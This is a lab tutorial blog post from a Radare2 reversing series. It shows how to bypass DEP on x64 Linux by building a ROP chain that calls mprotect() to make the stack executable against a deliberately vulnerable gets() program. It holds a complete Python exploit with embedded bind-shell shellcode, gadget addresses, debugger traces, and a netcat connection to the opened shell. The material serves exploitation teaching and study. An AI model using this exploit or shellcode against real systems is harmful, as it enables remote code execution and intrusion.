---
layout: post
title:  Reverse engineering x64 binaries with Radare2 - Enabling code execution on Stack
tags: reversing c radare
image: '/images//radare2/radare2_22.png'
date: 2022-06-19 15:01:35 -0700
---

##### DEP and Execution on the stack
Hello again my dear reverse engineers-in-progress. In the [previous](http://artik.blue/reversing-radare-21) post on these series we were talking about the Data Execution Prevention system also known as DEP, which is used to prevent programs from executing code in the memory space of the STACK. That is used to avoid an easy shellcode execution after controlling the RIP register during a buffer overflow. 

We were using the following program for test:
```C
#include <stdio.h>
void greet_me(){
    char name[200];
    gets(name);
    printf(“Hi there %s !!\n”,name);
}
int main(int argc, char *argv[]){
    greet_me();
 
    return 0; 
}
```
And we learnt that whenever we encounter DEP (and ASLR is disabled for our cases for now) we can still execute instructions and somehow control the execution flow to our interests by pointing RIP to addresses containing instructions in memory spaces marked as executable (RWX). 

Today we are going one step further, executing shellcode of our own located on the stack. When DEP is enable, nothing stops us from placing shellcode on the stack, we make RIP point to our shellcode though we'll trigger an ACCESS_VIOLATION after that and the program would stop. If we want to execute code there we'll need to trigger a mechanism for rendering stack executable again.

As a reminder, let us check the permissions on the stack after compiling our program without -execstack 
``` 
[0x555555554580]> dm
0x0000555555554000 # 0x0000555555555000 * usr     4K s -r-x /home/lab/exploit-pattern/greet /home/lab/exploit-pattern/greet ; map.home_lab_exploit_pattern_greet._r_x
0x0000555555754000 # 0x0000555555755000 - usr     4K s -r-- /home/lab/exploit-pattern/greet /home/lab/exploit-pattern/greet ; map.home_lab_exploit_pattern_greet._rw
0x0000555555755000 # 0x0000555555756000 - usr     4K s -rw- /home/lab/exploit-pattern/greet /home/lab/exploit-pattern/greet ; loc.__data_start
0x00007ffff79e2000 # 0x00007ffff7bc9000 - usr   1.9M s -r-x /lib/x86_64-linux-gnu/libc-2.27.so /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bc9000 # 0x00007ffff7dc9000 - usr     2M s ---- /lib/x86_64-linux-gnu/libc-2.27.so /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dc9000 # 0x00007ffff7dcd000 - usr    16K s -r-- /lib/x86_64-linux-gnu/libc-2.27.so /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcd000 # 0x00007ffff7dcf000 - usr     8K s -rw- /lib/x86_64-linux-gnu/libc-2.27.so /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 # 0x00007ffff7dd3000 - usr    16K s -rw- unk0 unk0
0x00007ffff7dd3000 # 0x00007ffff7dfc000 - usr   164K s -r-x /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so ; map.lib_x86_64_linux_gnu_ld_2.27.so._r_x
0x00007ffff7fdf000 # 0x00007ffff7fe1000 - usr     8K s -rw- unk1 unk1
0x00007ffff7ff8000 # 0x00007ffff7ffb000 - usr    12K s -r-- [vvar] [vvar] ; map.vvar_._r
0x00007ffff7ffb000 # 0x00007ffff7ffc000 - usr     4K s -r-x [vdso] [vdso] ; map.vdso_._r_x
0x00007ffff7ffc000 # 0x00007ffff7ffd000 - usr     4K s -r-- /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so ; map.lib_x86_64_linux_gnu_ld_2.27.so._rw
0x00007ffff7ffd000 # 0x00007ffff7ffe000 - usr     4K s -rw- /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 # 0x00007ffff7fff000 - usr     4K s -rw- unk2 unk2 ; map.unk0._rw
0x00007ffffffde000 # 0x00007ffffffff000 - usr   132K s -rw- [stack] [stack] ; map.stack_._rw
0xffffffffff600000 # 0xffffffffff601000 - usr     4K s ---x [vsyscall] [vsyscall] ; map.vsyscall_.___x
[0x555555554580]> dr rsp
0x7fffffffe0a0
[0x555555554580]> 
```
As you see read/write but not execute. Now when compiling with the execstack param:
```
[0x004007b0]> dm
0x0000000000400000 # 0x0000000000401000 * usr     4K s -r-x /home/lab/server /home/lab/server ; map.home_lab_server._r_x
0x0000000000600000 # 0x0000000000601000 - usr     4K s -r-x /home/lab/server /home/lab/server ; map.home_lab_server._rwx
0x0000000000601000 # 0x0000000000602000 - usr     4K s -rwx /home/lab/server /home/lab/server ; obj._GLOBAL_OFFSET_TABLE
0x00007ffff79e2000 # 0x00007ffff7bc9000 - usr   1.9M s -r-x /lib/x86_64-linux-gnu/libc-2.27.so /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bc9000 # 0x00007ffff7dc9000 - usr     2M s ---- /lib/x86_64-linux-gnu/libc-2.27.so /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dc9000 # 0x00007ffff7dcd000 - usr    16K s -r-x /lib/x86_64-linux-gnu/libc-2.27.so /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcd000 # 0x00007ffff7dcf000 - usr     8K s -rwx /lib/x86_64-linux-gnu/libc-2.27.so /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 # 0x00007ffff7dd3000 - usr    16K s -rwx unk0 unk0
0x00007ffff7dd3000 # 0x00007ffff7dfc000 - usr   164K s -r-x /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so ; map.lib_x86_64_linux_gnu_ld_2.27.so._r_x
0x00007ffff7fdf000 # 0x00007ffff7fe1000 - usr     8K s -rwx unk1 unk1
0x00007ffff7ff8000 # 0x00007ffff7ffb000 - usr    12K s -r-- [vvar] [vvar] ; map.vvar_._r
0x00007ffff7ffb000 # 0x00007ffff7ffc000 - usr     4K s -r-x [vdso] [vdso] ; map.vdso_._r_x
0x00007ffff7ffc000 # 0x00007ffff7ffd000 - usr     4K s -r-x /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so ; map.lib_x86_64_linux_gnu_ld_2.27.so._rwx
0x00007ffff7ffd000 # 0x00007ffff7ffe000 - usr     4K s -rwx /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 # 0x00007ffff7fff000 - usr     4K s -rwx unk2 unk2 ; map.unk0._rwx
0x00007ffffffde000 # 0x00007ffffffff000 - usr   132K s -rwx [stack] [stack] ; map.stack_._rwx
0xffffffffff600000 # 0xffffffffff601000 - usr     4K s ---x [vsyscall] [vsyscall] ; map.vsyscall_.___x
[0x004007b0]> 
``` 
That's how we want it to be! Let's try to get there.

#### MPROTECT()

mprotect() changes the access protections for the calling process’s memory pages containing any part of the address range in the interval [addr, addr+len-1]. addr must be aligned to page boundary… On success, mprotect() returns zero. On error, this system call returns -1, and errno is set to indicate the error. It is the function we are going to use to make the memory section related to the stack executable. 

```C
#include <sys/mman.h>

       int mprotect(void *addr, size_t len, int prot);
```
It takes three params, a pointer to the start of the memory section we are going to operate with, its width and the operation we would like to perform, PROT_EXEC in our case.

```
       PROT_NONE
              The memory cannot be accessed at all.

       PROT_READ
              The memory can be read.

       PROT_WRITE
              The memory can be modified.

       PROT_EXEC
              The memory can be executed.
```
Those flags can be combined by a simple addition, so 0x7 would give us full access + execution to our memory section of choice.

We can check that with the following program:
```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <signal.h>
void greet_me(){
    char name[200];
    gets(name);
    printf("Hi there %s !!\n",name);
}
int main(int argc, char *argv[]){
    int pagesize = sysconf(_SC_PAGE_SIZE);
    printf("Pagesize:%d\n",pagesize);
    if(mprotect(0x7ffffffde000,pagesize,0x7)==0)
    {
        printf("[i] Operation successfull\n");
        printf("[i] Memory region:  0x7ffffffe0000 to %lx has been      set to r-w-x\n",0x7ffffffe0000+pagesize);
    }
    else
        printf("[!] Operation failed\n");
    greet_me();
    
    return 0;  
}
```
After compiling and executing it we'll see something like this:
```
lab@lab-VirtualBox:~/exploit-pattern$ ./greet2
Pagesize:4096
[i] Operation successfull
[i] Memory region:  0x7ffffffe0000 to 7ffffffe1000 has been      set to r-w-x

Hi there  !!
lab@lab-VirtualBox:~/exploit-pattern$ 
```
At this point it gets very useful to debug it using radare2, so we can identify how the params are passed during the function call and inspect the memory map before and after the call:
```

0x00007ffff7dcf000 # 0x00007ffff7dd3000 - usr    16K s -rw- unk0 unk0
0x00007ffff7dd3000 # 0x00007ffff7dfc000 - usr   164K s -r-x /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so ; map.lib_x86_64_linux_gnu_ld_2.27.so._r_x
0x00007ffff7fdf000 # 0x00007ffff7fe1000 - usr     8K s -rw- unk1 unk1
0x00007ffff7ff8000 # 0x00007ffff7ffb000 - usr    12K s -r-- [vvar] [vvar] ; map.vvar_._r
0x00007ffff7ffb000 # 0x00007ffff7ffc000 - usr     4K s -r-x [vdso] [vdso] ; map.vdso_._r_x
0x00007ffff7ffc000 # 0x00007ffff7ffd000 - usr     4K s -r-- /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so ; map.lib_x86_64_linux_gnu_ld_2.27.so._rw
0x00007ffff7ffd000 # 0x00007ffff7ffe000 - usr     4K s -rw- /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 # 0x00007ffff7fff000 - usr     4K s -rw- unk2 unk2 ; map.unk0._rw
0x00007ffffffde000 # 0x00007ffffffff000 - usr   132K s -rw- [stack] [stack] ; map.stack_._rw
0xffffffffff600000 # 0xffffffffff601000 - usr     4K s ---x [vsyscall] [vsyscall] ; map.vsyscall_.___x


|           0x5555555547e6      48bf00e0fdff.  movabs rdi, map.stack_._rw ; 0x7ffffffde000
|           0x5555555547f0      e83bfeffff     call sym.imp.mprotect
|           ;-- rip:
|           0x5555555547f5 b    85c0           test eax, eax
|       ,=< 0x5555555547f7      7535           jne 0x55555555482e
|       |   0x5555555547f9      488d3df50000.  lea rdi, qword str.i__Operation_successfull ; 0x5555555548f5 ; "[i] Operation successfull" ; const char * s
|       |   0x555555554800      e8fbfdffff     call sym.imp.puts       ; int puts(const char *s)
|       |   0x555555554805      8b45fc         mov eax, dword [local_4h]
```
By doing this you'll realise how params are passed by rdi, rsi and rdx. And how our memory section of choice gets marked as executable after the call:
```
dc
dm
0x00007ffff7ffd000 # 0x00007ffff7ffe000 - usr     4K s -rw- /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 # 0x00007ffff7fff000 - usr     4K s -rw- unk2 unk2 ; map.unk0._rw
0x00007ffffffde000 # 0x00007ffffffdf000 - usr     4K s -rwx unk3 unk3 ; rdi
0x00007ffffffdf000 # 0x00007ffffffff000 - usr   128K s -rw- [stack] [stack]
0xffffffffff600000 # 0xffffffffff601000 - usr     4K s ---x [vsyscall] [vsyscall] ; map.vsyscall_.___x
```
That's what we want to see in our exploit. Note that you can also cat /proc/<pid>/maps to see the same memory mappings you see in radare2.
#### Crafting the exploit
Going back to our exploit, what follows is mostly known already. Now we need to find the rop gadgets / addresses for calling mprotect, that is the addr of mprotect and some rop gadgets to load our params into it. We can do that by directly looking at memory addresses and/or by locating the libc base address and doing (relative) calls from there as we saw.
```
lab@lab-VirtualBox:~/exploit-pattern$ cat /proc/20716/maps 
555555554000-555555555000 r-xp 00000000 08:01 925278                     /home/lab/exploit-pattern/greet
555555754000-555555755000 r--p 00000000 08:01 925278                     /home/lab/exploit-pattern/greet
555555755000-555555756000 rw-p 00001000 08:01 925278                     /home/lab/exploit-pattern/greet
555555756000-555555777000 rw-p 00000000 00:00 0                          [heap]
7ffff79e2000-7ffff7bc9000 r-xp 00000000 08:01 1179648                    /lib/x86_64-linux-gnu/libc-2.27.so
7ffff7bc9000-7ffff7dc9000 ---p 001e7000 08:01 1179648                    /lib/x86_64-linux-gnu/libc-2.27.so
7ffff7dc9000-7ffff7dcd000 r--p 001e7000 08:01 1179648                    /lib/x86_64-linux-gnu/libc-2.27.so
7ffff7dcd000-7ffff7dcf000 rw-p 001eb000 08:01 1179648                    /lib/x86_64-linux-gnu/libc-2.27.so
7ffff7dcf000-7ffff7dd3000 rw-p 00000000 00:00 0 
7ffff7dd3000-7ffff7dfc000 r-xp 00000000 08:01 1177433                    /lib/x86_64-linux-gnu/ld-2.27.so
7ffff7fdf000-7ffff7fe1000 rw-p 00000000 00:00 0 
7ffff7ff8000-7ffff7ffb000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffb000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00029000 08:01 1177433                    /lib/x86_64-linux-gnu/ld-2.27.so
7ffff7ffd000-7ffff7ffe000 rw-p 0002a000 08:01 1177433                    /lib/x86_64-linux-gnu/ld-2.27.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
lab@lab-VirtualBox:~/exploit-pattern$ 

[0x555555554580]> dm
0x0000555555554000 # 0x0000555555555000 * usr     4K s -r-x /home/lab/exploit-pattern/greet /home/lab/exploit-pattern/greet ; map.home_lab_exploit_pattern_greet._r_x
0x0000555555754000 # 0x0000555555755000 - usr     4K s -r-- /home/lab/exploit-pattern/greet /home/lab/exploit-pattern/greet ; map.home_lab_exploit_pattern_greet._rw
0x0000555555755000 # 0x0000555555756000 - usr     4K s -rw- /home/lab/exploit-pattern/greet /home/lab/exploit-pattern/greet ; loc.__data_start
0x00007ffff79e2000 # 0x00007ffff7bc9000 - usr   1.9M s -r-x /lib/x86_64-linux-gnu/libc-2.27.so /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bc9000 # 0x00007ffff7dc9000 - usr     2M s ---- /lib/x86_64-linux-gnu/libc-2.27.so /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dc9000 # 0x00007ffff7dcd000 - usr    16K s -r-- /lib/x86_64-linux-gnu/libc-2.27.so /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcd000 # 0x00007ffff7dcf000 - usr     8K s -rw- /lib/x86_64-linux-gnu/libc-2.27.so /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 # 0x00007ffff7dd3000 - usr    16K s -rw- unk0 unk0

[0x555555554580]> dmm~libc
0x7ffff79e2000 /lib/x86_64-linux-gnu/libc-2.27.so
[0x555555554580]> 
```
Finding mprotect is easy. At this point you better check that ASLR is disabled for this tutorial.
```
[0x7fffffffdf2b]> dmi libc mprotect~ mprotect$
1206 0x0011b7e0 0x7ffff7afd7e0   WEAK   FUNC   33 mprotect
```
After finding mprotect() what comes next is finding those rop gadgets, to load params into it:
```
*note that addresses may change on your machine; also if we forget to de-activate ASLR
[0x555555554580]> /R pop rdi
PROGRAM
  0x555555554288             421aff  sbb dil, dil
  0x55555555428b         0deae669cd  or eax, 0xcd69e6ea
  0x555555554290                 5f  pop rdi
  0x555555554291               776b  ja 0x5555555542fe
  0x555555554293             ca25a6  retf -0x59db

  0x555555554289               1aff  sbb bh, bh
  0x55555555428b         0deae669cd  or eax, 0xcd69e6ea
  0x555555554290                 5f  pop rdi
  0x555555554291               776b  ja 0x5555555542fe
  0x555555554293             ca25a6  retf -0x59db

  0x55555555428a       ff0deae669cd  dec dword [rip - 0x32961916]
  0x555555554290                 5f  pop rdi
  0x555555554291               776b  ja 0x5555555542fe
  0x555555554293             ca25a6  retf -0x59db

  0x555555554753                 5f  pop rdi
  0x555555554754                 c3  ret
```
rsi and rdx to load flags:
```
LIBC: note that addresses may change on your machine; also if we forget to de-activate ASLR
  0x7ffff7dee347                 5e  pop rsi
  0x7ffff7dee348                 c3  ret
```
Also note that if you are unable to find complete pop REG / ret addresses worry not, [some tutorials](https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-3-rop-chains-3cdcf17e8826) will show you that you can find somethinglike pop rsi; pop r15, ret and that can be used as well, you'll need to add some extra padding (ex \x90 * 8) on the stack to fill that r15 and continue to ret normally. At the end of the day it's all about understanding how the thing works and being able to adapt.
```
LIBC: note that addresses may change on your machine; also if we forget to de-activate ASLR
  0x7ffff7baf702                 5a  pop rdx
  0x7ffff7baf703                 c3  ret
```
So, if we combine that with what we already done on the previous tutorials, we can craft some exploit like this one here:
```Py
import sys
import struct

stck = lambda x : struct.pack ('<Q',x) # to cover for the little endian

nop_sled = b"\x90"*80+b"\xCC"*8 # breakpoints added for easy debugging

# Linux x86_64 87 bytes bind shell shellcode; BIND 5600 TCP
# https://www.exploit-db.com/exploits/41128
bind_shell = b"\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6"
bind_shell +=b"\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97"
bind_shell +=b"\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52"
bind_shell +=b"\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58"
bind_shell +=b"\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e"
bind_shell +=b"\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48"
bind_shell +=b"\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d"
bind_shell +=b"\x3c\x24\xb0\x3b\x0f\x05"

libc_base_address = 0x7ffff79e2000 # not needed for this tutorial

rwx = 0x00007ffffffde000 # base address of the stack

# params for the mprotect() call
pop_rdi = 0x555555554753
pop_rsi = 0x7ffff7dee347
pop_rdx = 0x7ffff7b12516

# base address for the shellcode, why that position? There is no particular reason, it just fits well there
shellcode_addr=0x7fffffffdf20  # position 80 

# address of the mprotect() syscall
mprotect_virtual = 0x7ffff7afd7e0

exploit = b"\x90"* 10
exploit += nop_sled
exploit += bind_shell
exploit += b"\x41" *  (204-len(exploit)) 

exploit += b"BBBBBBBB" #RBP overwrite
exploit += b"BBBB" # stack alingment
exploit += stck(pop_rdi)
exploit += stck(rwx)
exploit += stck(pop_rsi)
exploit += stck(0x21000) # the space for the program STACK from start to end
# 0x21000 last mem address of stack - first mem address of stack
exploit += stck(pop_rdx)
exploit += stck(0x7) # full access rwx
exploit += stck(mprotect_virtual)
exploit += stck(shellcode_addr)

sys.stdout.buffer.write(exploit)
```
The exploit code is well commented so, easy to follow. But tu summarize: We overflow the stack, RBP gets over-written by all B's, ret returns to whats on top of the stack, that is our pop rdi and what comes next, so our params get loaded in the registers rdi,rsi,rdx then the last ret (pop rdx; ret) returns to whats on top of the stack, that is the mprotect address, mprotect() gets called with our params, the stack is now executable and, again, we return to? Yes, to whats on top of the stack, now that is a pointer to where our shellcode starts, so the execution continues there and as the stack is now executable, our bind shell gets executed.

The stack should look like this:

![The stack state](https://miro.medium.com/max/1400/1*0QmDeZvSWl-TtCZBBbA9hw.png)

Let's check the registers'state after the overflow:

```
|           0x5555555546c4      90             nop
|           0x5555555546c5      c9             leave
\           0x5555555546c6      c3             ret
[0x55555555468a]> db 0x5555555546c6
[0x55555555468a]> dc
hit breakpoint at: 5555555546c6
[0x55555555468a]> dr
rax = 0x000000eb
rbx = 0x00000000
rcx = 0x00000000
rdx = 0x00000000
r8 = 0x00000000
r9 = 0x000000de
r10 = 0xffffff22
r11 = 0x00000246
r12 = 0x555555554580
r13 = 0x7fffffffe0a0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x555555757270
rdi = 0x00000001
rsp = 0x7fffffffdfa8
rbp = 0x4242424242424242
rip = 0x5555555546c6
rflags = 0x00000202
orax = 0xffffffffffffffff
[0x55555555468a]> 
```
As well as the stack:
```
[0x55555555468a]> pxq @ rsp
0x7fffffffdfa8  0x0000555555554753  0x00007ffffffde000   SGUUUU..........
0x7fffffffdfb8  0x00007ffff7dee347  0x0000000000021000   G...............
0x7fffffffdfc8  0x00007ffff7b12516  0x0000000000000007   .%..............
0x7fffffffdfd8  0x00007ffff7afd7e0  0x00007fffffffdf20   ........ .......
0x7fffffffdfe8  0x0000555555554600  0x0000000000000000   .FUUUU..........
0x7fffffffdff8  0x9bc6ed78b872ae73  0x0000555555554580   s.r.x....EUUUU..
0x7fffffffe008  0x00007fffffffe0a0  0x0000000000000000   ................


[0x55555555468a]> pd 20 @ 0x7fffffffdf20
            0x7fffffffdf20      90             nop
            0x7fffffffdf21      90             nop
            0x7fffffffdf22      90             nop
            0x7fffffffdf23      90             nop
            0x7fffffffdf24      90             nop
            0x7fffffffdf25      90             nop
            0x7fffffffdf26      90             nop
            0x7fffffffdf27      90             nop
            0x7fffffffdf28      90             nop
            0x7fffffffdf29      90             nop
            0x7fffffffdf2a      cc             int3
            0x7fffffffdf2b      cc             int3
            0x7fffffffdf2c      cc             int3
            0x7fffffffdf2d      cc             int3
            0x7fffffffdf2e      cc             int3
            0x7fffffffdf2f      cc             int3
            0x7fffffffdf30      cc             int3
            0x7fffffffdf31      cc             int3
            0x7fffffffdf32      4831c0         xor rax, rax
```
As we see, after our rop gadgets, params are loaded, the mprotect() called:
```
[0x7ffff7afd7e0]> dr rsi
0x00021000
[0x7ffff7afd7e0]> dr rdx
0x00000007
[0x7ffff7afd7e0]> dr rdi
0x7ffffffde000
[0x7ffff7afd7e0]> pd 10
            ;-- rip:
            0x7ffff7afd7e0      b80a000000     mov eax, 0xa
            0x7ffff7afd7e5      0f05           syscall
            0x7ffff7afd7e7      483d01f0ffff   cmp rax, -0xfff
        ,=< 0x7ffff7afd7ed      7301           jae 0x7ffff7afd7f0
        |   0x7ffff7afd7ef      c3             ret
        `-> 0x7ffff7afd7f0      488b0d71f62c.  mov rcx, qword [0x7ffff7dcce68] ; [0x7ffff7dcce68:8]=-128
            0x7ffff7afd7f7      f7d8           neg eax
            0x7ffff7afd7f9      648901         mov dword fs:[rcx], eax
            0x7ffff7afd7fc      4883c8ff       or rax, 0xffffffffffffffff
            0x7ffff7afd800      c3             ret
[0x7ffff7afd7e0]> 
```
The stack is not executable before that, but after that YES
```
BEFORE
[0x555555554580]> dm
0x00007ffff7dcf000 # 0x00007ffff7dd3000 - usr    16K s -rw- unk0 unk0
0x00007ffff7dd3000 # 0x00007ffff7dfc000 - usr   164K s -r-x /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so ; map.lib_x86_64_linux_gnu_ld_2.27.so._r_x
0x00007ffff7fdf000 # 0x00007ffff7fe1000 - usr     8K s -rw- unk1 unk1
0x00007ffff7ff8000 # 0x00007ffff7ffb000 - usr    12K s -r-- [vvar] [vvar] ; map.vvar_._r
0x00007ffff7ffb000 # 0x00007ffff7ffc000 - usr     4K s -r-x [vdso] [vdso] ; map.vdso_._r_x
0x00007ffff7ffc000 # 0x00007ffff7ffd000 - usr     4K s -r-- /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so ; map.lib_x86_64_linux_gnu_ld_2.27.so._rw
0x00007ffff7ffd000 # 0x00007ffff7ffe000 - usr     4K s -rw- /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 # 0x00007ffff7fff000 - usr     4K s -rw- unk2 unk2 ; map.unk0._rw
0x00007ffffffde000 # 0x00007ffffffff000 - usr   132K s -rw- [stack] [stack] ; map.stack_._rw
0xffffffffff600000 # 0xffffffffff601000 - usr     4K s ---x [vsyscall] [vsyscall] ; map.vsyscall_.___x

AFTER
[0x7fffffffdf2b]> dm
x-gnu/libc-2.27.so
0x00007ffff7dcf000 # 0x00007ffff7dd3000 - usr    16K s -rw- unk0 unk0
0x00007ffff7dd3000 # 0x00007ffff7dfc000 - usr   164K s -r-x /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so ; map.lib_x86_64_linux_gnu_ld_2.27.so._r_x
0x00007ffff7fdf000 # 0x00007ffff7fe1000 - usr     8K s -rw- unk1 unk1
0x00007ffff7ff8000 # 0x00007ffff7ffb000 - usr    12K s -r-- [vvar] [vvar] ; map.vvar_._r
0x00007ffff7ffb000 # 0x00007ffff7ffc000 - usr     4K s -r-x [vdso] [vdso] ; map.vdso_._r_x
0x00007ffff7ffc000 # 0x00007ffff7ffd000 - usr     4K s -r-- /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so ; map.lib_x86_64_linux_gnu_ld_2.27.so._rw
0x00007ffff7ffd000 # 0x00007ffff7ffe000 - usr     4K s -rw- /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 # 0x00007ffff7fff000 - usr     4K s -rw- unk2 unk2 ; map.unk0._rw
0x00007ffffffde000 # 0x00007ffffffff000 * usr   132K s -rwx [stack] [stack] ; rdi
0xffffffffff600000 # 0xffffffffff601000 - usr     4K s ---x [vsyscall] [vsyscall] ; map.vsyscall_.___x
``` 
And after mprotect() we jump to our shellcode:
```
[0x7fffffffdf2b]> pd 10
            ;-- rip:
            0x7fffffffdf2b      cc             int3
            0x7fffffffdf2c      cc             int3
            0x7fffffffdf2d      cc             int3
            0x7fffffffdf2e      cc             int3
            0x7fffffffdf2f      cc             int3
            0x7fffffffdf30      cc             int3
            0x7fffffffdf31      cc             int3
            0x7fffffffdf32      4831c0         xor rax, rax
            0x7fffffffdf35      4831d2         xor rdx, rdx
            0x7fffffffdf38      4831f6         xor rsi, rsi
[0x7fffffffdf2b]> 
```
And the bind shell starts to work:
```
lab@lab-VirtualBox:~/exploit-pattern$ nc 127.0.0.1 5600
ls

LICENSE.md
README.md
exploit.py
```
  
See you soon :)

#### References

[ch0pin blog](https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-3-rop-chains-3cdcf17e8826)
[syrion blog](https://syrion.me/blog/elfx64-bypass-nx-with-mprotect/)
[calling convention](https://aaronbloomfield.github.io/pdr/book/x86-64bit-ccc-chapter.pdf)
